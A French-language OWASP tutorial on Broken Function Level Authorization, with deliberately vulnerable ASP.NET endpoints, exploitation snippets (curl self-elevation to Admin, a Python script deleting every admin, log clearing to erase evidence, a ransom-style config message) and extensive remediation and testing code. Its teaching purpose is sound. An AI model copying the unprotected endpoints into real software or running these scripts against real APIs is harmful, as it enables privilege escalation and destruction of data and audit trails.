# API5:2023 - Broken Function Level Authorization (BFLA)

## 📋 Description de la vulnérabilité

La vulnérabilité **Broken Function Level Authorization (BFLA)** se produit lorsqu'une API ne vérifie pas correctement si l'utilisateur authentifié a le droit d'accéder à une fonction ou endpoint spécifique. Contrairement à BOLA qui concerne l'accès aux objets, BFLA concerne l'accès aux fonctionnalités, particulièrement les fonctions administratives ou privilégiées.

### Impact potentiel
- Accès non autorisé aux fonctions administratives
- Élévation de privilèges horizontale et verticale
- Modification de configurations système
- Suppression ou modification de données critiques
- Contournement des contrôles d'accès métier

## 🎯 Endpoints vulnérables

Le contrôleur `Api05BflaController` expose de nombreux endpoints administratifs sans vérification d'autorisation :

### 1. **Gestion des utilisateurs (Admin)**
- `DELETE /api/bfla/admin/delete-user/{id}` - Suppression d'utilisateur
- `POST /api/bfla/elevate/{id}` - Élévation de privilèges
- `GET /api/bfla/admin/export-users` - Export complet des utilisateurs
- `POST /api/bfla/admin/create-user` - Création avec n'importe quel rôle
- `POST /api/bfla/admin/reset-password/{id}` - Reset de mot de passe

### 2. **Configuration système (Admin)**
- `POST /api/bfla/admin/set-config` - Modification de configuration
- `DELETE /api/bfla/admin/clear-logs` - Suppression des logs
- `GET /api/bfla/admin/audit-log` - Accès aux logs d'audit

### 3. **Fonctions premium**
- `POST /api/bfla/admin/set-premium/{id}` - Attribution statut premium
- `POST /api/bfla/admin/restore-backup` - Restauration de backup

## 🔍 Code vulnérable expliqué

### Exemple 1 : Suppression d'utilisateur sans vérification

```csharp
[HttpDelete("admin/delete-user/{id}")]
public async Task<IActionResult> DeleteUser(int id)
{
    // VULNÉRABLE: Aucune vérification du rôle de l'utilisateur actuel
    var user = await _context.Users.FindAsync(id);
    if (user == null) return NotFound();
    
    _context.Users.Remove(user);
    await _context.SaveChangesAsync();
    
    return Ok(new { deleted = id });
}
```

**Problème** : N'importe quel utilisateur authentifié peut supprimer d'autres utilisateurs.

### Exemple 2 : Élévation de privilèges non protégée

```csharp
[HttpPost("elevate/{id}")]
public async Task<IActionResult> ElevateUserRole(int id, [FromBody] string newRole)
{
    // VULNÉRABLE: Pas de vérification d'autorisation admin
    var user = await _context.Users.FindAsync(id);
    if (user == null) return NotFound();
    
    user.Role = newRole;
    await _context.SaveChangesAsync();
    
    return Ok(new { elevated = id, role = newRole });
}
```

**Problème** : Permet à n'importe qui de changer les rôles, y compris le sien.

### Exemple 3 : Export de données sensibles

```csharp
[HttpGet("admin/export-users")]
public async Task<IActionResult> ExportUsers()
{
    // VULNÉRABLE: Fonction admin accessible à tous
    var users = await _context.Users.ToListAsync();
    var csv = "Id,Email,Role\n" + string.Join("\n", users.Select(u => $"{u.Id},{u.Email},{u.Role}"));
    var bytes = System.Text.Encoding.UTF8.GetBytes(csv);
    
    return File(bytes, "text/csv", "users.csv");
}
```

### Exemple 4 : Modification de configuration globale

```csharp
[HttpPost("admin/set-config")]
public IActionResult SetConfig([FromBody] ConfigModel model)
{
    // VULNÉRABLE: Permet de modifier la configuration globale
    // Pas de vérification du rôle admin
    
    return Ok(new { updated = true, config = model });
}
```

## 💥 Scénarios d'exploitation

### Scénario 1 : Auto-élévation de privilèges
```bash
# Un utilisateur normal s'attribue le rôle admin
curl -X POST http://localhost:5000/api/bfla/elevate/123 \
    -H "Authorization: Bearer [USER_TOKEN]" \
    -H "Content-Type: application/json" \
    -d '"Admin"'

# Maintenant il peut utiliser toutes les fonctions admin
```

### Scénario 2 : Suppression d'utilisateurs concurrents
```python
import requests

def delete_all_admins(base_url, user_token):
    # Récupérer la liste des utilisateurs
    headers = {"Authorization": f"Bearer {user_token}"}
    response = requests.get(f"{base_url}/api/bfla/admin/export-users", headers=headers)
    
    # Parser le CSV pour trouver les admins
    users = response.text.split('\n')[1:]  # Skip header
    for user in users:
        parts = user.split(',')
        if len(parts) >= 3 and parts[2] == 'Admin':
            user_id = parts[0]
            # Supprimer chaque admin
            requests.delete(f"{base_url}/api/bfla/admin/delete-user/{user_id}", headers=headers)
            print(f"Admin {user_id} supprimé")
```

### Scénario 3 : Mise en mode maintenance
```bash
# Mettre l'application en maintenance
curl -X POST http://localhost:5000/api/bfla/admin/set-config \
    -H "Authorization: Bearer [USER_TOKEN]" \
    -H "Content-Type: application/json" \
    -d '{
        "maintenanceMode": true,
        "motd": "System compromised - send bitcoin to..."
    }'
```

### Scénario 4 : Effacement des preuves
```bash
# Supprimer les logs après une attaque
curl -X DELETE http://localhost:5000/api/bfla/admin/clear-logs \
    -H "Authorization: Bearer [USER_TOKEN]"
```

### Scénario 5 : Attribution massive de comptes premium
```python
def make_everyone_premium(base_url, token):
    headers = {"Authorization": f"Bearer {token}"}
    
    # Récupérer tous les utilisateurs
    users = requests.get(f"{base_url}/api/users", headers=headers).json()
    
    # Rendre tout le monde premium
    for user in users:
        requests.post(
            f"{base_url}/api/bfla/admin/set-premium/{user['id']}", 
            headers=headers,
            json=True
        )
```

## 🛡️ Solutions de remédiation

### 1. **Implémenter une vérification d'autorisation systématique**

```csharp
[HttpDelete("admin/delete-user/{id}")]
[Authorize(Roles = "Admin")]  // Vérification au niveau du framework
public async Task<IActionResult> DeleteUser(int id)
{
    // Double vérification dans le code
    if (!User.IsInRole("Admin"))
    {
        return Forbid("Admin access required");
    }
    
    // Empêcher l'auto-suppression
    var currentUserId = int.Parse(User.FindFirst(ClaimTypes.NameIdentifier)?.Value ?? "0");
    if (currentUserId == id)
    {
        return BadRequest("Cannot delete your own account");
    }
    
    var user = await _context.Users.FindAsync(id);
    if (user == null) return NotFound();
    
    // Log l'action
    _logger.LogWarning("Admin {AdminId} deleted user {UserId}", currentUserId, id);
    
    _context.Users.Remove(user);
    await _context.SaveChangesAsync();
    
    return Ok(new { deleted = id });
}
```

### 2. **Créer un service d'autorisation centralisé**

```csharp
public interface IAuthorizationService
{
    Task<bool> CanDeleteUser(ClaimsPrincipal user, int targetUserId);
    Task<bool> CanElevateRole(ClaimsPrincipal user, string targetRole);
    Task<bool> CanAccessAdminFunctions(ClaimsPrincipal user);
    Task<bool> CanModifyConfiguration(ClaimsPrincipal user);
}

public class AuthorizationService : IAuthorizationService
{
    private readonly AppDbContext _context;
    
    public async Task<bool> CanDeleteUser(ClaimsPrincipal user, int targetUserId)
    {
        // Seuls les super-admins peuvent supprimer des utilisateurs
        if (!user.IsInRole("SuperAdmin"))
            return false;
            
        // Empêcher l'auto-suppression
        var currentUserId = int.Parse(user.FindFirst(ClaimTypes.NameIdentifier)?.Value ?? "0");
        if (currentUserId == targetUserId)
            return false;
            
        // Ne pas permettre la suppression du dernier admin
        var targetUser = await _context.Users.FindAsync(targetUserId);
        if (targetUser?.Role == "SuperAdmin")
        {
            var adminCount = await _context.Users.CountAsync(u => u.Role == "SuperAdmin");
            if (adminCount <= 1)
                return false;
        }
        
        return true;
    }
    
    public async Task<bool> CanElevateRole(ClaimsPrincipal user, string targetRole)
    {
        var currentRole = user.FindFirst(ClaimTypes.Role)?.Value;
        
        // Hiérarchie des rôles
        var roleHierarchy = new Dictionary<string, int>
        {
            ["User"] = 1,
            ["Premium"] = 2,
            ["Moderator"] = 3,
            ["Admin"] = 4,
            ["SuperAdmin"] = 5
        };
        
        if (!roleHierarchy.ContainsKey(currentRole) || !roleHierarchy.ContainsKey(targetRole))
            return false;
            
        // On ne peut attribuer que des rôles inférieurs au sien
        return roleHierarchy[currentRole] > roleHierarchy[targetRole];
    }
}
```

### 3. **Utiliser des politiques d'autorisation personnalisées**

```csharp
// Dans Program.cs
builder.Services.AddAuthorization(options =>
{
    options.AddPolicy("AdminOnly", policy =>
        policy.RequireRole("Admin", "SuperAdmin"));
        
    options.AddPolicy("SuperAdminOnly", policy =>
        policy.RequireRole("SuperAdmin"));
        
    options.AddPolicy("CanManageUsers", policy =>
        policy.Requirements.Add(new ManageUsersRequirement()));
        
    options.AddPolicy("CanModifyConfig", policy =>
        policy.RequireClaim("permission", "config:write"));
});

// Requirement personnalisé
public class ManageUsersRequirement : IAuthorizationRequirement { }

public class ManageUsersHandler : AuthorizationHandler<ManageUsersRequirement>
{
    protected override Task HandleRequirementAsync(
        AuthorizationHandlerContext context,
        ManageUsersRequirement requirement)
    {
        var user = context.User;
        
        if (user.IsInRole("Admin") || user.IsInRole("SuperAdmin"))
        {
            // Vérifier des permissions supplémentaires si nécessaire
            if (user.HasClaim("department", "HR") || user.IsInRole("SuperAdmin"))
            {
                context.Succeed(requirement);
            }
        }
        
        return Task.CompletedTask;
    }
}
```

### 4. **Implémenter un middleware de vérification**

```csharp
public class FunctionAuthorizationMiddleware
{
    private readonly RequestDelegate _next;
    private readonly ILogger<FunctionAuthorizationMiddleware> _logger;
    
    public async Task InvokeAsync(HttpContext context, IAuthorizationService authService)
    {
        var path = context.Request.Path.Value?.ToLower() ?? "";
        
        // Vérifier les endpoints admin
        if (path.Contains("/admin/"))
        {
            if (!context.User.Identity?.IsAuthenticated ?? true)
            {
                context.Response.StatusCode = 401;
                return;
            }
            
            if (!context.User.IsInRole("Admin"))
            {
                _logger.LogWarning("Unauthorized admin access attempt by {User} to {Path}", 
                    context.User.Identity.Name, path);
                    
                context.Response.StatusCode = 403;
                await context.Response.WriteAsync("Admin access required");
                return;
            }
        }
        
        await _next(context);
    }
}
```

### 5. **Séparer les contrôleurs par niveau d'autorisation**

```csharp
[ApiController]
[Route("api/admin")]
[Authorize(Roles = "Admin,SuperAdmin")]
public class AdminController : ControllerBase
{
    // Tous les endpoints ici nécessitent un rôle admin
}

[ApiController]
[Route("api/superadmin")]
[Authorize(Roles = "SuperAdmin")]
public class SuperAdminController : ControllerBase
{
    // Endpoints super-admin uniquement
}

[ApiController]
[Route("api/users")]
[Authorize] // Authentification requise mais pas de rôle spécifique
public class UserController : ControllerBase
{
    // Endpoints utilisateur standard
}
```

### 6. **Audit et journalisation des actions sensibles**

```csharp
public class AuditService
{
    private readonly AppDbContext _context;
    private readonly IHttpContextAccessor _httpContextAccessor;
    
    public async Task LogAdminAction(string action, object details)
    {
        var userId = _httpContextAccessor.HttpContext?.User
            .FindFirst(ClaimTypes.NameIdentifier)?.Value;
            
        var auditLog = new AuditLog
        {
            UserId = userId,
            Action = action,
            Details = JsonSerializer.Serialize(details),
            IpAddress = _httpContextAccessor.HttpContext?.Connection.RemoteIpAddress?.ToString(),
            Timestamp = DateTime.UtcNow
        };
        
        _context.AuditLogs.Add(auditLog);
        await _context.SaveChangesAsync();
    }
}

// Utilisation dans le contrôleur
[HttpPost("admin/set-config")]
[Authorize(Policy = "CanModifyConfig")]
public async Task<IActionResult> SetConfig([FromBody] ConfigModel model)
{
    await _auditService.LogAdminAction("ConfigurationChanged", new { 
        OldConfig = _currentConfig, 
        NewConfig = model 
    });
    
    // Appliquer la configuration...
}
```

## 🔧 Bonnes pratiques

1. **Authentification != Autorisation** : Toujours vérifier les permissions, pas seulement l'authentification
2. **Principe du moindre privilège** : Donner uniquement les permissions nécessaires
3. **Séparation des endpoints** : Séparer clairement les APIs admin des APIs utilisateur
4. **Validation en profondeur** : Vérifier les autorisations à plusieurs niveaux
5. **Audit trail** : Enregistrer toutes les actions administratives
6. **Rate limiting renforcé** : Limites plus strictes sur les endpoints admin
7. **Tests de régression** : Tests automatisés pour chaque rôle
8. **Documentation claire** : Documenter qui peut accéder à quoi

## 📊 Tests de détection

### Test manuel d'escalade de privilèges
```bash
# 1. Se connecter en tant qu'utilisateur normal
TOKEN=$(curl -X POST http://localhost:5000/api/auth/login \
    -H "Content-Type: application/json" \
    -d '{"email":"user@example.com","password":"password"}' \
    | jq -r '.token')

# 2. Tenter d'accéder aux fonctions admin
curl -X DELETE http://localhost:5000/api/bfla/admin/delete-user/1 \
    -H "Authorization: Bearer $TOKEN" \
    -v

# 3. Tenter de s'auto-élever
curl -X POST http://localhost:5000/api/bfla/elevate/[MY_ID] \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -d '"Admin"'
```

### Script de test automatisé
```python
import requests

def test_bfla_vulnerabilities(base_url, user_token, admin_token):
    endpoints = [
        ("DELETE", "/api/bfla/admin/delete-user/999"),
        ("POST", "/api/bfla/elevate/1", {"body": "Admin"}),
        ("GET", "/api/bfla/admin/export-users"),
        ("POST", "/api/bfla/admin/set-config", {"body": {"maintenanceMode": True}}),
        ("DELETE", "/api/bfla/admin/clear-logs"),
        ("GET", "/api/bfla/admin/audit-log"),
    ]
    
    results = []
    
    for method, endpoint, *args in endpoints:
        # Test avec token utilisateur normal
        headers = {"Authorization": f"Bearer {user_token}"}
        if args and "body" in args[0]:
            headers["Content-Type"] = "application/json"
            
        response = requests.request(
            method, 
            f"{base_url}{endpoint}",
            headers=headers,
            json=args[0]["body"] if args and "body" in args[0] else None
        )
        
        if response.status_code in [200, 201, 204]:
            results.append({
                "endpoint": endpoint,
                "vulnerable": True,
                "message": f"❌ Accessible avec token utilisateur normal"
            })
        else:
            results.append({
                "endpoint": endpoint,
                "vulnerable": False,
                "message": f"✅ Protégé (status: {response.status_code})"
            })
    
    return results
```

### Test avec Postman/Insomnia

1. Créer une collection avec tous les endpoints admin
2. Configurer deux environnements :
   - Un avec token utilisateur normal
   - Un avec token admin
3. Exécuter la collection avec chaque environnement
4. Vérifier que les endpoints admin retournent 403 avec le token utilisateur

## ⚠️ Attention

Ce code est **intentionnellement vulnérable** et ne doit **JAMAIS** être utilisé en production. Il sert uniquement à des fins éducatives pour comprendre et apprendre à détecter les vulnérabilités BFLA.

## 📚 Références

- [OWASP API Security Top 10 2023 - BFLA](https://owasp.org/API-Security/editions/2023/en/0xa5-broken-function-level-authorization/)
- [OWASP Authorization Testing Guide](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/README)
- [CWE-285: Improper Authorization](https://cwe.mitre.org/data/definitions/285.html)
- [Authorization Best Practices](https://cheatsheetseries.owasp.org/cheatsheets/Authorization_Cheat_Sheet.html)